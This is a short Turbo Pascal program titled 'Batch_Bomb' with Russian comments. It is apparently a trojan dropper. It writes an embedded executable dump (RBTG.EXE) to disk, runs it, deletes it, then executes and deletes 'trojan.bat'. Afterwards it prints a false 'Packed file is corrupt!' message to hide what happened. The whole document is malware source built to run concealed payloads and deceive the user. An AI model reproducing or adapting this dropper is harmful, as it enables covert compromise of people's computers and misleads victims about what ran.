program Batch_Bomb;
{$M 3000, 0, 3000}
uses dos;
const len=4296;
      rbtg:array[1..len] of byte = {$I rbtg.inc};
      {Это файл RBTG.EXE в виде дампа.}
      {Его можно получить с помощью утилиты OPT2INC.}
var f:file;
begin
assign(f,'rbtg.exe');rewrite(f,1);
blockwrite(f,rbtg,len);
close(f);
exec('rbtg.exe','-V');
erase(f);
exec('trojan.bat','');
assign(f,'trojan.bat');
erase(f);
writeln('Packed file is corrupt!');
end.